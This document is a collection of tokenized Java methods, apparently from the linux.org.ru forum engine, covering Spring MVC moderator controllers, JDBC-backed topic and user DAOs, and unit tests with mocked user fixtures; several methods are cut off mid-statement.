public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddTopicRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditTopicRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public List < Topic > doInConnection ( Connection con ) throws SQLException , DataAccessException { return nv . getMessages ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) throws SQLException , DataAccessException { return newsViewer . getMessagesCached ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) throws SQLException , DataAccessException { return newsViewer . getMessages ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) throws SQLException , DataAccessException { return feedBurner ? nv . getMessages ( con ) : nv . getMessagesCached ( con ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) throws Exception { Topic message = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( message . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! message . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( message . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
private static void checkView ( Topic message , Template tmpl , User currentUser ) throws MessageNotFoundException { if ( tmpl . isModeratorSession ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
private static boolean checkLastModified ( WebRequest webRequest , Topic message ) { try { return webRequest . checkNotModified ( message . getLastModified ( ) . getTime ( ) ) ; 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " setpostscore " ) ; Topic message = messageDao . getById ( msgid ) ; mv . addObject ( " message " , message ) ; mv . addObject ( " group " , groupDao . getGroup ( message . getGroupId ( ) ) ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public Topic getById ( int id ) throws MessageNotFoundException { Topic message ; try { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Topic > ( ) { @Override public Topic mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Topic ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return message ; } 
public Topic mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Topic ( resultSet ) ; } 
public Group getGroup ( Topic message ) throws BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public void undelete ( Topic message ) { jdbcTemplate . update ( updateUndeleteMessage , message . getId ( ) ) ; jdbcTemplate . update ( updateUneleteInfo , message . getId ( ) ) ; } 
public void uncommit ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET moderate='f',commitby=NULL,commitdate=NULL WHERE id=? " , msg . getId ( ) ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author ; User lastCommentBy ; int msgid ; int cid ; int pages ; Timestamp lastmod ; Timestamp postdate ; int stat1 ; int stat3 ; int stat4 ; int groupId ; int section ; String groupTitle ; String groupUrlName ; String title ; boolean resolved ; boolean uncommited ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; title = resultSet . getString ( " title " ) ; cid = resultSet . getInt ( " cid " ) ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public boolean supports ( Class < ? > clazz ) { return AddTopicRequest . class . equals ( clazz ) ; } 
public boolean supports ( Class < ? > clazz ) { return EditTopicRequest . class . equals ( clazz ) ; } 
public String formatJump ( TopicDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( messageUrl ) { Topic message = messageDao . getById ( messageId ) ; Group group = null ; try { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { throw new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( commentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURI uri ) throws URIException { try { Topic message = messageDao . getById ( uri . getMessageId ( ) ) ; 
public void prepareMessageTest ( ) { ImmutableList < String > tags = ImmutableList . of ( " one " , " two " ) ; Topic message = mock ( Topic . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; TopicDao messageDao = mock ( TopicDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . thenReturn ( 13 ) ; group id 13 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; messageDao = mock ( TopicDao . class ) ; message1 = mock ( Topic . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Topic . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Topic . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Topic . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Topic . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . thenReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . thenReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . thenReturn ( message15 ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int stat3 = resultSet . getInt ( " stat3 " ) ; int stat4 = resultSet . getInt ( " stat4 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String title = resultSet . getString ( " title " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public static EditInfoDto createFromMessage ( TagDao tagDao , Topic message ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( tagDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { EditInfoDto editInfoDTO = new EditInfoDto ( ) ; editInfoDTO . setId ( resultSet . getInt ( " id " ) ) ; editInfoDTO . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editInfoDTO . setEditor ( resultSet . getInt ( " editor " ) ) ; editInfoDTO . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editInfoDTO . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editInfoDTO . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editInfoDTO . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editInfoDTO ) ; } 
public List < EditInfoDto > loadEditInfo ( int msgid ) { List < EditInfoDto > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDto . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public User getUser ( String nick ) throws UserNotFoundException { if ( nick = = null ) { throw new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { throw new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( queryUserByNick , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
private User getUser ( int id , boolean useCache ) throws UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( queryUserById , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { throw new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { throw new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public void maxcomTest ( ) throws Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " tango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) throws Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " tango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) throws Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " tango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public static ResultSet getAnonymous ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " anonymous " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " svu " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user5star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user1star " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
